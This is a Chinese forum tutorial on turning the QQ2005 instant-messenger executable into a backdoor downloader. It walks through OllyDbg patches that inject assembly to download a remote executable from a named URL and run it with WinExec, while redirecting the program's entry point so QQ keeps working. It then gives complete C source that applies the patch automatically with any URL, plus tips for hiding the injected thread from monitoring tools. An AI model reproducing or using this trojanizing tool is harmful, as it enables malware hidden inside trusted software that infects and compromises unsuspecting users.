

# 把 qq2005 做成后门之编程实现(简单，高手勿入)

> 原文：[`www.pediy.com/kssd/pediy07/pediy7-273.htm`](https://www.pediy.com/kssd/pediy07/pediy7-273.htm)

  
    把 qq2005 做成后门之编程实现（原创）  
1。思路篇  
平心而论，我不怎么喜欢那些全是操作的文章，从头到尾都是先这样，再那样。几乎学不到什么东西。  
比如讲某个木马，怎么反弹端口，怎么隐蔽，就是不给出思路的。实在不利于我们菜鸟的学习。牢骚几句，  
开始正题：  
首先，我们来手工把 qq2005 做成后门(必要的过程)，然后在具体分析，思路是怎么横空出世的。  
因为编程实现不过是把手工的过程变成了自动的过程而已。这里又面临一个选择，是详细写出用 ollydbg 修改  
qq 的详细过程，还是一笔带过呢？考虑到《逆》一文中的这个过程被一笔带过了(肯定带来的不少我等菜鸟的痛苦)，  
所以我选择详细写出这个过程。这样才算手把手的教，是吧。由于我很讨厌抓图，所以一部分过程我就不抓图了。  
  
用 ollydbg 打开 qq.exe，这时候程序会停在入口点，F2 下个断点，为什么呢？因为要么要修改 qq 的入口代码。  
下断点后，很容易在找到这个位置，按 ALT+B，双击断点，又回到入口了吧，是不是很方便。呵呵  
拖动 CPU 窗口的滚动条，到 qq.exe 的尾部，找到一大片的全是 db 0 的地方，这个可以理解为 PE 的空隙。  
我找到的地址是 004D4D90，按着鼠标左键向下拖动，选中的部分是黄色的，按 CTRL+E 或者右键－>二进制->  
编辑, 输入要下载的后门的地址："http://hackor.51.net/mm.exe"(不包括引号)， 回车，看到一堆不知道是什么的汇编代码吧，没有关系，CTRL+A 分析一下，好看多了吧，如图 1。同样的方法在 004D4DCD(距离 004D4D90 比较远，是为了留出足够的空间来存放比较长的 URL)添加"d:\\\\ok.exe",如图 2。继续添加如下汇编代码(为什么这样添加呢，随后给出)：  
  
004D4DEB       60              pushad  
004D4DEC       6A 00           push 0  
004D4DEE    .  6A 00           push 0  
004D4DF0    .  68 CD4D4D00     push QQ.004D4DCD                    ;  ASCII "d:\\\\ok.exe"  
004D4DF5    .  68 904D4D00     push QQ.004D4D90                    ;  ASCII "http://hackor.51.net/mm.exe"  
004D4DFA    .  6A 00           push 0  
004D4DFC    .  E8 CAEBBC75     call urlmon.URLDownloadToFileA  
004D4E01    .  61              popad  
004D4E02    .  60              pushad  
004D4E03    .  6A 05           push 5                              ; /ShowState = SW\_SHOW  
004D4E05    .  68 CD4D4D00     push QQ.004D4DCD                    ; |CmdLine = "d:\\\\ok.exe"  
004D4E0A    .  E8 26AF9777     call kernel32.WinExec               ; \\WinExec  
004D4E0F    .  61              popad  
004D4E10    .  C3              retn  
004D4E11       00              db 00  
004D4E12       00              db 00  
004D4E13    >  60              pushad  
004D4E14    .  6A 00           push 0                              ; /arg = NULL  
004D4E16    .  6A 00           push 0                              ; |stksize = 0  
004D4E18    .  68 EB4D4D00     push QQ.004D4DEB                    ; |start = QQ.004D4DEB  
004D4E1D    .  E8 65307377     call MSVCRT.\_beginthread            ; \\\_beginthread  
004D4E22    .  61              popad  
  
  
004D4E23    .  55              push ebp  
004D4E24    .  8BEC            mov ebp,esp  
004D4E26    .  6A FF           push -1  
004D4E28    .^ E9 30FDF8FF     jmp QQ.00464B5D  
  
按 CTRL+A 分析一下，看到了什么：  
004D4DEB    .  60 6A 00        ascii "\`j",0  
004D4DEB 居然变成了这个，呵呵，用 ollydbg 的小技巧，选中这行，右键->分析->在下一次分析期间，将选择视为命令。呵呵，ok 了吧。编辑的时候还会出现其它的不好看的东西，那是 ollydbg 分析错误导致的，需要手动调整，视为命令，字符等等(具体情形请自行分析)。  
现在来回答为什么这样添加的问题：004D4E18 处压入的是 004D4DEB(也就是 URLDownloadToFileA 的地址)，这样当这个\_beginthread 启动的时候，会调用 URLDownloadToFileA，去下载我们的 mm.exe，紧接着执行 WinExec 函数，这样我们下载的 mm.exe 就被执行了，最后用 retn 返回。其中 004D4E22 到 004D4E26 是 qq 的入口代码，为了不影响 qq 的运行，我们还是要保存地。下面接着修改 qq 的入口代码，使之跳到 004D4E13 去执行我们的\_beginthread。注意修改前请先保存，右键－>复制到可执行文件，选择一个文件名就 ok 了。  
修改后(如图 3)：  
00464B58 Q> $ /E9 B6020700     jmp QQ.004D4E13  
00464B5D    > |68 18104E00     push QQ.004E1018  
修改完成后，右键复制到可执行文件，全部修正。  
整个过程要注意堆栈平衡。上面的 pushad 和 popad 就是用来保持堆栈平衡的。  
  
2。具体编程实现：  
有了前面的过程，这个就简单了。用什么语言实现都一样，看你的个人爱好了。我用的 c 语言  
我们 的程序就是修改 qq，把正常的 qq.exe 修改成上面这样的。那么要修改那些地方呢？  
有 2 个办法，用 ollydbg 同时开修改后的 qq.exe 和修改前的 qq.exe，对比发现即可。但是不太方便。  
还可以使用 Hex Workshop，我用的就是这个，它可以比较 2 个文件，下载地址：http://www.pediy.com/tools/Editors/Hex%20workshop/Hex%20workshop%204.23.zip  
安装完成后，打开 Hex Workshop，CTRL+K,选择路径，如图 4，ok  
F6 将自动定位到不同之处。  
偏移为：  
0x64b58  
0xD4D90  
0xd4dcd  
0xd4deb  
  
我们只需要编程修正以上地方的代码就可以了，还有一个问题是，我怎么知道要修正多少个字节呢？  
用 Hex Workshop 计算一下就知道了啊(2 个地址相减就 ok 了)，修正字节数并不要求特别准确。不影响程序的运行就可以了。  
整个程序如下(非常简单)：  
 //winxp sp1 + qq2005  
  
#include <stdio.h>  
#include <stdlib.h>  
#include <string.h>  
  
int main(int argc, char\* argv\[\])  
{  
  FILE \*fp;  
  unsigned int i;  
  int entryPoint\[\] = {233,182,2,7,0};  //入口要修正的字节  
  char \*pDownURL = NULL;    //指向下载 URL 的指针  
  char \*pPathAndFileName = NULL;   //指向文件路径和文件名的指针  
  int backDoor\[\] =   
  {  
      96,106,0,106,0,104,205,77,77,0,104,144,  
      77,77,0,106,0,232,202,235,188,117,  
      97,96,106,5,104,205,77,77,0,232,38,  
      175,151,119,97,195,0,0,96,106,0,106,  
      0,104,235,77,77,0,232,101,48,115,  
      119,97,85,139,236,106,255,233,48,  
      253,248,255,0  
  };  
  
      if(argc != 3)  
      {  
    printf("\\n\\t\\t Make qq to be downloader\\n");  
    printf("\\n\\t\\t\\t\\tngaut All rights reserved.\\n\\n");  
          printf("Usage: %s <downloadURL> <pathAndFileName> \\n", argv\[0\]);  
    printf("%s and qq.exe should at the same directory\\n", argv\[0\]);  
    printf("The os should be winxp sp1 and The qq version should be 2005\\n");  
    printf("pathAndFileName should like:\\n\\t d:\\\\\\\\mm.exe not d:\\\\mm.exe\\n");  
          return 1;  
      }  
    
  pDownURL = argv\[1\];  
  pPathAndFileName = argv\[2\];  
    
  printf("\\n\\t\\t Make qq to be downloader\\n");  
  printf("Cracking......\\n");  
    
  // 1. 打开文件 qq.exe ,这个是正常的 qq.exe  
  if ((fp = fopen("QQ.exe", "r+"))==NULL)  
  {                      
    printf("error!!!  Can not open qq.exe!!!\\n\\n");  
    printf("Press any key to continue\\n");  
    getchar();  
    exit(0);  
  }  
    
  //2. set entry point  
  fseek(fp, 0x64b58, SEEK\_SET);    
  for (i=0; i<5; i++)  
  {  
    fputc( (char)entryPoint\[i\], fp);  
  }  
  
    
    
  // 3. set downURL  
  fseek(fp, 0x00D4D90, SEEK\_SET);  
    
  for (i=0; i<strlen(pDownURL); i++)  
  {  
    fputc(pDownURL\[i\], fp);  
  }  
  fputc(0, fp);    //这里写入 0，因为必须要以 0 结尾，下同  
    
    
    
  // 4. set pathAndFileName  
  fseek(fp, 0xd4dcd, SEEK\_SET);  
    
  for (i=0; i<strlen(pPathAndFileName); i++)  
  {  
    fputc(pPathAndFileName\[i\], fp);  
  }  
  fputc(0, fp);  
    
    
    
    
  // 5. set backDoor code  
  fseek(fp, 0xd4deb, SEEK\_SET);  
    
  for (i=0; i<66; i++)  
  {  
    fputc( (char)backDoor\[i\], fp);  
  }  
    
    
  fclose(fp);  
    
  printf("\\nThanks for using, already cracked!!!\\n");  
  printf("\\n\\t\\t\\t\\tngaut All rights reserved.\\n\\n");  
    
  return 0;  
}  
  
  
上面的 i 用于控制要写入的字节数，并不需要非常精确，但是不要影响程序的执行。每次写入前  
都要用 fseek 函数移动文件指针到指定位置。用 ollydbg 看看程序的反汇编代码，你会发现 backDoor  
就是我们后门关键部分对应的汇编代码，上面的程序有个小技巧，那就是如何得到  
entryPoint 和 backDoor 数组的内容。而且可以看到它们都是 int，使用时才被转化为 char  
下面的代码用于得到 entryPoint 数组和 backDoor 数组的内容(个人方法很巧妙)：  
//winxp sp1 + qq2005  
  
#include <stdio.h>  
#include <stdlib.h>  
#include <string.h>  
  
int main(int argc, char\* argv\[\])  
{  
  FILE \*fp;  
  unsigned int i;  
    
  // 1. 打开文件 qq.exe, 注意这个 qq 是修改过的  
  if ((fp = fopen("QQ.exe", "r+"))==NULL)  
  {                      
    printf("error!!!  Can not open qq.exe!!!\\n\\n");  
    printf("Press any key to continue\\n");  
    getchar();  
    exit(0);  
  }  
    
    
  //get entryPoint code  
  fseek(fp, 0x64b58, SEEK\_SET);  
  for (i=0; i<5; i++)  
  {  
    printf("%d,", fgetc(fp));  
  }  
  printf("\\n\\n");  
    
  fseek(fp, 0xd4deb, SEEK\_SET);  
    
  for (i=0; i<67; i++)  
  {  
    printf("%d,", fgetc(fp));  
  }  
  printf("\\n\\n");  
    
  fclose(fp);  
    
  
  return 0;  
}  
运行结果如图 5，真漂亮，呵呵。  
  
编程介绍完了。怎么样，还算简单吧。  
最后补充一点，我们创建线程还是逃不过某些软件的监视，那么我们该怎么解决呢。我们自己不创建就行了，  
借用别人的啊，比如 flashget 多线程下载，再说了，现在太多的软件都创建线程，只要不我们的代码挂上别人的线程就可以了，winxp sp2 和 flashget1.65 测试成功，未做更多的测试，应该是可以的。我想这个方法可以叫做借尸还魂吧，呵呵，具体修改过程以及对应的代码分析就不写了，手指都麻了，好了，下次见。  
  
  
趁自己还年轻，多写点东西贡献给大家。也算是自己人生一大志愿。总体来说我写的东西都很简单，因为我就是一菜鸟，写不出什么高难度的东西来。   ^\_^ 

支持一下，实际就是补丁的制作过程。 

 4dd466d0e1e0cc123afbe504da2462ca